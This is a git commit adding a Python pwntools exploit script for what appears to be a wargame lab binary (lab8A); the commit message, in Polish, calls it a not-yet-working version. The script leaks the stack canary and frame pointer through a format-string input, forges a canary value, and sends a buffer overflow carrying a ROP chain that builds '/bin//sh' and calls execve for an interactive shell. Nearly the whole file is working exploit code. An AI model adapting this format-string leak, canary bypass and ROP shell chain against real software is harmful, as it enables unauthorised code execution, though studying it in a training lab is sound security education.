aefc07f0fbf7a65abff683eb042feda38b1f05fc
fumfel <fumfi.255@gmail.com>
2018-02-21 12:34:00 +0100

    Jeszcze niedziałająca wersja dla 8A.

---
+++ lab8a.py
@@ -0,0 +1,65 @@
+from pwn import *
+from struct import pack
+
+# For one gadget RCE:
+# LIBC_BASE = ""
+# OGRCE_OFFSET = 0x42f90
+BIN_PATH = "/levels/lab08/lab8A"
+DEADBEEF = 0xdeadbeef
+
+
+def build_rop_chain():
+    rop_chain = ''
+
+    rop_chain += pack('<I', 0x0807030a)  # pop edx ; ret
+    rop_chain += pack('<I', 0x080ed000)  # @ .data
+    rop_chain += pack('<I', 0x080bd226)  # pop eax ; ret
+    rop_chain += '/bin'
+    rop_chain += pack('<I', 0x080a3a1d)  # mov dword ptr [edx], eax ; ret
+    rop_chain += pack('<I', 0x0807030a)  # pop edx ; ret
+    rop_chain += pack('<I', 0x080ed004)  # @ .data + 4
+    rop_chain += pack('<I', 0x080bd226)  # pop eax ; ret
+    rop_chain += '//sh'
+    rop_chain += pack('<I', 0x080a3a1d)  # mov dword ptr [edx], eax ; ret
+    rop_chain += pack('<I', 0x0807030a)  # pop edx ; ret
+    rop_chain += pack('<I', 0x080ed008)  # @ .data + 8
+    rop_chain += pack('<I', 0x08055b40)  # xor eax, eax ; ret
+    rop_chain += pack('<I', 0x080a3a1d)  # mov dword ptr [edx], eax ; ret
+    rop_chain += pack('<I', 0x080481c9)  # pop ebx ; ret
+    rop_chain += pack('<I', 0x080ed000)  # @ .data
+    rop_chain += pack('<I', 0x080e76ad)  # pop ecx ; ret
+    rop_chain += pack('<I', 0x080ed008)  # @ .data + 8
+    rop_chain += pack('<I', 0x0807030a)  # pop edx ; ret
+    rop_chain += pack('<I', 0x080ed008)  # @ .data + 8
+    rop_chain += pack('<I', 0x08055b40)  # xor eax, eax ; ret
+    rop_chain += pack('<I', 0x08098e30)  # add eax, 3 ; ret
+    rop_chain += pack('<I', 0x08098e30)  # add eax, 3 ; ret
+    rop_chain += pack('<I', 0x08098e30)  # add eax, 3 ; ret
+    rop_chain += pack('<I', 0x08098e17)  # add eax, 2 ; ret
+    rop_chain += pack('<I', 0x08048ef6)  # int 0x80
+
+    return rop_chain
+
+
+p = process(BIN_PATH)
+
+log.info("Stage #1 - Leaking canary & EBP")
+p.recv()
+# %130$08X - Canary & 0x%131$X - EBP
+p.sendline("0x%130$08X:0x%131$X")
+buf = p.recv(21)
+leaked_canary, leaked_ebp = [int(n, 16) for n in buf.split(":")]
+log.info("Leaked canary: 0x{:x}".format(leaked_canary))
+log.info("Leaked EBP: 0x{:x}".format(leaked_ebp))
+p.sendline("A")
+
+val = DEADBEEF ^ leaked_canary
+
+log.info("Stage #2 - Custom canary value: %x", val)
+log.info("Stage #3 - Writing payload")
+
+payload = "A" * 16 + pack('<I', DEADBEEF) + "____" + pack('<I', leaked_canary) + pack('<I', leaked_ebp) + build_rop_chain()
+
+p.recvuntil("..I like to read ^_^ <==  ")
+p.sendline(payload)
+p.interactive()
